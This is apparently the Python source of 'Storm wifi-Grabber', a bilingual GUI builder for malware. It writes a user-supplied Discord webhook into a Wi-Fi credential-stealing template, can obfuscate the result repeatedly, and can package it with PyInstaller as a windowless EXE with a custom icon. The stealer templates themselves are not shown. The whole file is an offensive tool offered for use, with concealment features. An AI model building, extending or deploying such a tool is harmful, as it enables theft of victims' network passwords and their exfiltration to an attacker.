from customtkinter import *
from tkinter import *
import customtkinter
import os
from PIL import Image
from CTkMenuBar import *
import CTkMessagebox
import time
import subprocess
from language import *
def start_():
    def remove():
        if os.path.exists("mal5.py"):
            os.remove("mal5.py")
        if os.path.exists(input_file):
            os.remove(input_file)
        for file in os.listdir():
            if file.endswith(".spec"):
                os.remove(file)
    def py_2_exe():
        file_namee = input_file
        icon = exe_icon_path.get()
        print(f"Debug: file_namee = '{file_namee}'")
        print(f"Debug: icon = '{icon}'")
        file_dir = os.path.dirname(file_namee)
        if file_dir:
            os.chdir(file_dir)
        if not icon:
            print("error in py 2 exe funtion : No icon found! Icon set to 'none'.")
            subprocess.run(["pyinstaller", "--onefile", "--noconsole", os.path.basename(file_namee)])
            remove()
        else:
            subprocess.run(["pyinstaller", "--onefile", "--noconsole", "--icon", icon, os.path.basename(file_namee)])
            remove()
        CTkMessagebox.CTkMessagebox(title="Done", message="Conversion to EXE completed successfully.",
                                    icon="check", font=(("Courier New", 15)))

    def obfuscate(input_file, iterations):
        if not os.path.isfile(input_file):
            print(f"Error in obf function: Input file '{input_file}' does not exist\ntrying with default name.")
            return
        current_input = input_file
        for i in range(1, iterations):
            output_file = f"mal{i+1}.py"
            print(f"Obfuscating {current_input} -> {output_file}")
            try:
                result = subprocess.run(
                    ["python", "obf_py.py", "-i", current_input, "-o", output_file, "-r", "2", "--include-imports"],
                    shell=False
                )

                if result.returncode != 0:
                    print(f"Error in obf function: Obfuscation failed for {current_input}.")
                    break
                current_input = output_file
                if os.path.exists(current_input) and i > 1:
                    os.remove(f"mal{i}.py")

            except Exception as e:
                print(e)

    def entry():
        global input_file
        times = 5
        file_1 = file_name.get()
        input_file = file_1+".py" or "malware.py"
        if not os.path.isfile(input_file):
            print(f"Error in entry function: Input file '{input_file}' does not exist\ntrying with default name ---> malware.py .")
            input_file = "malware.py"
        obfuscate(input_file, iterations=times)


    def builder_():
        global all_data, ssids_passwords, encrypt, export_as_exe

        all_data = set1_.get()
        ssids_passwords = set2_.get()
        encrypt = encrypt_.get()
        export_as_exe = export_exe.get()

        if all_data and ssids_passwords:
            quests = CTkMessagebox.CTkMessagebox(title="ERROR", message=message2,
                                                icon="cancel", font=(("Courier New", 15)))
        
            

        start_builder(all_data, ssids_passwords, encrypt, export_as_exe)

    def start_builder(all_data, ssids_passwords, encrypt, export_as_exe):
        global webhook, file_namee
        webhook = DiscordWebh00k.get()
        file_namee = file_name.get() or "malware.py"

        def process_file(template_path, output_path):
            with open(template_path, "rb") as f:
                rdata = f.read()
            with open(output_path, "wb") as f1:
                f1.write(rdata)
            with open(output_path, "rb") as f2:
                new_data = f2.read().replace(b"YOUR_DISCORD_WEBHOOK_URL", webhook.encode('utf-8'))
            with open(output_path, "wb") as file:
                file.write(new_data)

        if not webhook:
            CTkMessagebox.CTkMessagebox(title="ERROR", message="no webhook, no service!",
                                        icon="warning", font=(("Courier New", 15)))
            return

        if all_data:
            template_path = "Grabber/Full wifi info.py"
        elif ssids_passwords:
            template_path = "Grabber/SSIDS & Passwords.py"
        else:
            print("No valid option selected! ---> return.")
            return

        if not file_namee.endswith(".py"):
            file_namee += ".py"

        process_file(template_path, file_namee)

        if encrypt:
            entry()
        if export_as_exe:
            py_2_exe()


    def change_to_ar():
        with open('language.py', 'w', encoding='utf-8') as e:
            e.write(r"""
def ar():
    global name,done_message,current_language, yes_,message2, message_en, message_ar, cancel_, no_, exe_icon_path_x, exe_icon_path_y, font_3, exe_icon_path_t, exe_text, exe_x, exe_y, enc_y, enc_x, enc_text, en, ar, lang, LOGO, dishok, type_, font_, x_inFile, y_inFile, x_inhook, y_inhook, type_x, type_y, full_info, wifi_info_y, wifi_info_x, font_2, ssids_pass_only, ssids_pass_only_x, ssids_pass_only_y, title_, set_full, set1_x, set1_y, set_user_pass, set2_x, set2_y, execute, execute_x, execute_y, About_, settings_, update, about__, lab_logo_x, lab_logo_y
    done_message ="اكتملت العملية بنجاح"
    message2="لا يمكنك اختيار كلا الخيارين"
    en = "الأنجليزية"
    ar = "العربية"
    lang = "اللغة"
    title_ = "ستورم لسحب بيانات الشبكات اللاسلكية"
    LOGO = 'images\\1logo_ar.png'
    name = "\t\tاسم الملف"
    dishok = "  رابط الويب هوك الخاص بك"
    type_ = "أنواع البيانات المسحوبة"
    full_info = "جميع إعدادات الشبكة: المعرفات، كلمات المرور،التشفير،المصادقة،والتحكم,الخ"
    ssids_pass_only = "بيانات الاعتماد: أسماء المستخدمين وكلمات المرور "
    set_full = "تحديد"
    set_user_pass = "تحديد"
    execute = "أستخراج"
    settings_ = "الاعدادات"
    About_ = "حول"
    update = "تحديث"
    about__ = "الاصدار 2.1"
    enc_text = "تشويش"
    exe_text = "exe استخراج بصيغة"
    exe_icon_path_t = "\t      مسار الايقونة"
    yes_ = "نعم"
    no_ = "لا"
    cancel_ = "الغاء"
    message_ar = "هل تريد تغيير اللغة الي العربية؟"
    message_en = "هل تريد تغيير اللغة الى الانجليزية؟"
    x_inFile = 500
    y_inFile = 55
    x_inhook = 500
    y_inhook = 175
    type_x = 600
    type_y = 300
    wifi_info_x = 125
    wifi_info_y = 350
    ssids_pass_only_x = 435
    ssids_pass_only_y = 400
    set1_x = 20
    set1_y = 350
    set2_x = 320
    set2_y = 400
    execute_x = 30
    execute_y = 600
    lab_logo_x = 30
    lab_logo_y = 5
    enc_x = 900
    enc_y = 500
    exe_x = 600
    exe_y = 500
    exe_icon_path_x = 600
    exe_icon_path_y = 550
    font_ = (("Courier New", 30))
    font_2 = (("Courier New", 20))
    font_3 = (("Courier New", 20))
    current_language = "ar_bic"
ar() """)

    def change_to_en():
        with open('language.py', 'w') as file:
            file.write(r"""
def en():
    global name,done_message, current_language,message2, yes_, message_en, message_ar, cancel_, no_, exe_icon_path_x, exe_icon_path_y, font_3, exe_icon_path_t, exe_text, exe_x, exe_y, enc_y, enc_x, enc_text, en, ar, lang, LOGO, dishok, type_, font_, x_inFile, y_inFile, x_inhook, y_inhook, type_x, type_y, full_info, wifi_info_y, wifi_info_x, font_2, ssids_pass_only, ssids_pass_only_x, ssids_pass_only_y, title_, set_full, set1_x, set1_y, set_user_pass, set2_x, set2_y, execute, execute_x, execute_y, About_, settings_, update, about__, lab_logo_x, lab_logo_y
    done_message="the process has been completed successfully"
    message2 = "You can't select both options"
    en = "English"
    ar = "Arbic"
    lang = "language"
    LOGO = 'images\\logo.png'
    title_ = "Storm wifi-Grabber"
    name = "File name"
    dishok = "Discord webhook"
    type_ = "grabber type"
    full_info = "All profile settings: SSIDs, passwords, encryption, authentication,etc."
    ssids_pass_only = "Network credentials: SSIDs and passwords only."
    set_full = "Set"
    execute = "execute"
    settings_ = "Settings"
    About_ = "About"
    update = "Update"
    about__ = "version 2.1"
    enc_text = "Obfuscation"
    exe_text = "Export as exe"
    exe_icon_path_t = "icon Path"
    yes_ = "Yes"
    no_ = "No"
    cancel_ = "Cancel"
    message_ar = "Do you want to change the language to arbic?"
    message_en = "Do you want to change the language to english?"
    x_inFile = 30
    y_inFile = 55
    x_inhook = 30
    y_inhook = 175
    type_x = 30
    type_y = 300
    wifi_info_x = 20
    wifi_info_y = 360
    ssids_pass_only_x = 20
    ssids_pass_only_y = 400
    set1_x = 930
    set1_y = 360
    set2_x = 600
    set2_y = 400
    execute_x = 850
    execute_y = 600
    lab_logo_x = 650
    lab_logo_y = 5
    enc_x = 30
    enc_y = 500
    exe_x = 250
    exe_y = 500
    exe_icon_path_x = 30
    exe_icon_path_y = 550
    font_ = (("Castellar", 40))
    font_2 = (("Courier New", 20))
    font_3 = (("Courier New", 15))
    current_language = "en_glish"
en() """)

    def lang_ar():
        quests = CTkMessagebox.CTkMessagebox(title="?", message=message_ar,
                                             icon="question", option_1=yes_, option_2=no_, option_3=cancel_, font=(("Courier New", 15)))
        res = quests.get()
        if res == yes_:
            if current_language == "ar_bic":
                CTkMessagebox.CTkMessagebox(title="خطأ", message="ان اللغة عربية اساسا",
                                            icon="warning", option_1="خروج", font=(("Courier New", 15)))
            elif current_language == "en_glish":
                change_to_ar()
                res=CTkMessagebox.CTkMessagebox(title="اكتمل",message="تم تغيير اللغة بنجاح! , سيتم اعادة تشغيل البرنامج",icon="check",option_1="حسنا", font=(("Courier New", 15)))
                res.get()
                if res:
                    python = sys.executable
                    os.execl(python, python, *sys.argv)
    def lang_en():
        quests = CTkMessagebox.CTkMessagebox(title="?", message=message_en,
                                             icon="question", option_1=yes_, option_2=no_, option_3=cancel_, font=(("Courier New", 15)))
        res = quests.get()
        if res == yes_:
            if current_language == "en_glish":
                CTkMessagebox.CTkMessagebox(title="ERROR", message="the language is already english!",
                                            icon="warning", option_1="exit", font=(("Courier New", 15)))
            elif current_language == "ar_bic":
                change_to_en()
                res=CTkMessagebox.CTkMessagebox(title="DONE", message="the language has been changed,program will be restarted",
                                            icon="check",option_1="ok", font=(("Courier New", 15)))
                res.get()
                if res:
                    python = sys.executable
                    os.execl(python, python, *sys.argv)
    def exe_():
        global exe_icon_path

        def close():
            exe_icon_path.configure(width=0, height=0)
            exe_icon_path.place(x=20000)
            export_exe.configure(command=exe_)

        export_exe.configure(command=close)
        exe_icon_path = CTkEntry(MainFrame, text_color="white", bg_color="black", fg_color="black", border_color="white",
                                 font=font_3, corner_radius=15, border_width=1, placeholder_text=exe_icon_path_t, width=350, height=50)
        exe_icon_path.place(x=exe_icon_path_x, y=exe_icon_path_y)

    main = CTk()
    main.geometry("1122x1000+300+1")
    main.resizable(0, 0)
    main.config(bg="black")
    main.title(title_)

    menu = CTkMenuBar(main)
    button_1 = menu.add_cascade(settings_)
    button_4 = menu.add_cascade(About_)
    dropdown1 = CustomDropdownMenu(widget=button_1)
    dropdown1.add_option(option=update, command=lambda: print("updated"))
    sub_menu = dropdown1.add_submenu(lang)
    sub_menu.add_option(option=ar, command=lang_ar)
    sub_menu.add_option(option=en, command=lang_en)
    dropdown1.add_separator()
    dropdown4 = CustomDropdownMenu(widget=button_4)
    dropdown4.add_option(option=about__)

    image = CTkImage(light_image=Image.open(LOGO), size=(1122, 225))
    image2 = CTkImage(light_image=Image.open('images\\logo2.png'), size=(349, 346))

    labelmg = CTkLabel(main, image=image, bg_color="black", text=" ")
    MainFrame = CTkFrame(master=main, width=1049, height=700, fg_color="black", bg_color="black",
                         border_width=1, corner_radius=50, border_color="white")
    labelmg2 = CTkLabel(MainFrame, image=image2, bg_color="black", text=" ")

    file_name = CTkEntry(MainFrame, text_color="white", bg_color="black", fg_color="black", border_color="white",
                         font=font_, corner_radius=25, border_width=1, placeholder_text=name, width=500, height=100)
    DiscordWebh00k = CTkEntry(MainFrame, text_color="white", bg_color="black", fg_color="black", border_color="white",
                              font=font_, corner_radius=25, border_width=1, placeholder_text=dishok, width=500, height=100)

    grabber_ = CTkLabel(MainFrame, text=type_, font=font_)
    full_wifi_info = CTkLabel(MainFrame, text=full_info, font=font_2)
    ssids_pass = CTkLabel(MainFrame, text=ssids_pass_only, font=font_2)

    set1_ = CTkCheckBox(MainFrame, text=set_full, text_color="white", bg_color="black", hover_color="grey80",
                        fg_color="black", border_color="white", font=(("Courier New", 15)), corner_radius=25, border_width=1, width=25, height=30)
    set2_ = CTkCheckBox(MainFrame, text=set_full, text_color="white", bg_color="black", hover_color="grey80",
                        fg_color="black", border_color="white", font=(("Courier New", 15)), corner_radius=25, border_width=1, width=25, height=30)
    execute_ = CTkButton(MainFrame, text=execute, command=builder_, text_color="white", bg_color="black", hover_color="grey80",
                         fg_color="black", border_color="white", font=(("Courier New", 20)), corner_radius=25, border_width=1, width=70, height=50)

    encrypt_ = CTkCheckBox(MainFrame, text=enc_text, text_color="white", bg_color="black", hover_color="grey80",
                           fg_color="black", border_color="white", font=(("Courier New", 20)), corner_radius=25, border_width=1, width=25, height=30)

    export_exe = CTkSwitch(MainFrame, command=exe_, text=exe_text, progress_color="gray", button_hover_color="white",
                           text_color="white", bg_color="black", fg_color="black", border_color="white", font=(("Courier New", 20)), corner_radius=25, border_width=1, width=25, height=30)

    labelmg.pack(fill=X)
    labelmg2.place(x=lab_logo_x, y=lab_logo_y)
    MainFrame.place(x=35, y=255)
    file_name.place(x=x_inFile, y=y_inFile)
    DiscordWebh00k.place(x=x_inhook, y=y_inhook)
    grabber_.place(x=type_x, y=type_y)
    full_wifi_info.place(x=wifi_info_x, y=wifi_info_y)
    ssids_pass.place(x=ssids_pass_only_x, y=ssids_pass_only_y)
    set1_.place(x=set1_x, y=set1_y)
    set2_.place(x=set2_x, y=set2_y)
    execute_.place(x=execute_x, y=execute_y)
    encrypt_.place(x=enc_x, y=enc_y)
    export_exe.place(x=exe_x, y=exe_y)
    main.mainloop()

if __name__ == "__main__":
    start_()

# StormTools 
